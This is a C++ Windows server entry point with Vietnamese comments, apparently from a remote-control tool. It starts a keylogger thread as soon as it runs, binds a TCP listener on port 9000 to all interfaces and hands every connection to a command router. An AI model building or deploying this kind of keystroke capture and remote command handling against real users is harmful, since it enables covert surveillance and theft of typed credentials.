// server.cpp (File Main - TCP Logic Server)
// Nhiem vu: Khoi tao server, chap nhan ket noi va chuyen cho Router.
// LANG NGHE TREN CONG 9000
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

#include "CommandRouter.h" // DUNG ROUTER MOI
#include "controllers/KeylogController.h"
#include "controllers/DeviceController.h"
#include "utils/helpers.h"
#include "utils/logging.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Ole32.lib")

using namespace Gdiplus;
using namespace std;

int main()
{
    int TCP_PORT = 9000; // Cong C++ lang nghe
    int WEB_PORT = 8080; // Cong Gateway (Node.js) ma client se truy cap

    SetConsoleOutputCP(65001);
    srand((unsigned int)time(0));

    GdiplusStartupInput g;
    ULONG_PTR t;
    GdiplusStartup(&t, &g, NULL);

    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);

    // Khoi tao cac dich vu (keylogger, quet thiet bi)
    KeylogController::startKeyLoggerThread();
    DeviceController::buildDeviceListJson();

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in a = {AF_INET, htons(TCP_PORT)};
    a.sin_addr.s_addr = INADDR_ANY;
    bind(s, (sockaddr *)&a, sizeof(a));
    listen(s, SOMAXCONN);

    // --- BAT DAU THAY DOI ---
    cout << "=== LOGIC SERVER (TCP) READY ON PORT " << TCP_PORT << " ===" << endl;
    cout << "Dang cho Gateway (Node.js) ket noi..." << endl;

    // Lay va in ra cac dia chi IP LAN
    cout << "\n-------------------------------------------------" << endl;
    cout << "May chu Gateway (Node.js) dang chay tai cong: " << WEB_PORT << endl;
    cout << "Cac thiet bi khac trong mang co the truy cap tai:" << endl;

    // Goi ham tu utils/helpers.h
    auto ips = getLocalIPv4Addresses();
    for (auto &ip : ips)
    {
        cout << "http://" << ip << ":" << WEB_PORT << endl;
    }
    cout << "-------------------------------------------------\n"
         << endl;
    // --- KET THUC THAY DOI ---

    while (1)
    {
        sockaddr_in ca;
        int calen = sizeof(ca);
        SOCKET c = accept(s, (sockaddr *)&ca, &calen); // Chap nhan ket noi moi
        if (c != INVALID_SOCKET)
        {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ca.sin_addr), ip, INET_ADDRSTRLEN);
            string clientInfo = string(ip) + ":" + to_string(ntohs(ca.sin_port));

            thread([](SOCKET client, string ip)
                   {
                CommandRouter router; 
                router.handleClient(client, ip); }, c, clientInfo)
                .detach();
        }
    }

    GdiplusShutdown(t);
    WSACleanup();
    closesocket(s);
    return 0;
}